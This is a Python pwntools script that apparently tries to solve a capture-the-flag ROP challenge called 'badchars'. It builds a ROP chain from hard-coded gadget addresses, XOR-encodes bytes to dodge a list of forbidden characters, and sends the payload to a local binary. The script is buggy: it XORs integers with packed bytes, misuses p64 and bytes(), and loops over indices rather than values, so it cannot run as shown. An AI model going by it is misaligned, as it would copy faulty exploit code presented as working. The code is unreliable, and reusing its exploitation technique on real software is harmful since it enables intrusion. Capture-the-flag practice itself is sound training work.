#!/usr/bin/env python3
from pwn import *
import sys

nop = b"\x90"
null = b"\x00"
counter = 0

key = b"\x0A"
badchars = [ 0x78, 0x67, 0x61, 0x2e ]

pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)
xor_rdi_dh = p64(0x0000000000400629)


def CheckBadBytes(c: bytes) -> bool:
	global counter

	bad_bytes = bytearray(badchars)
	if c in bad_bytes:
		counter += 1
		return True

	return False


def XorCipher(buffer: bytes) -> bytes:
	global key

	array = bytearray(buffer)
	for c in range(len(array)):
		c ^= p64(key)

		if CheckBadBytes(c):
			print(" ! bad bytes detected in encoded payload. Get wrecked")
			exit(1)

	return bytes(buffer)


def Generate(buffer: bytes) -> bytes:
	global key

	array = bytearray(buffer)
	for c in range(len(array)):
		if CheckBadBytes(c):
			print(" * found {} bad bytes".format(counter))
			buffer += pop_r14_r15
			buffer += p64(key)
			buffer += XorCipher(c)
			buffer += xor_r15_r14
	return buffer


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	length = 0x2
	payload = (nop * (length + 8)) 

	# test
	for i in range(len(badchars)):
		payload += bytes(badchars[i])

	print(" * payload before checks:")
	print(''.join('\\x{:02x}'.format(x) for x in payload))

	final = Generate(payload)
	p.send(final)

	print(p.recvall())

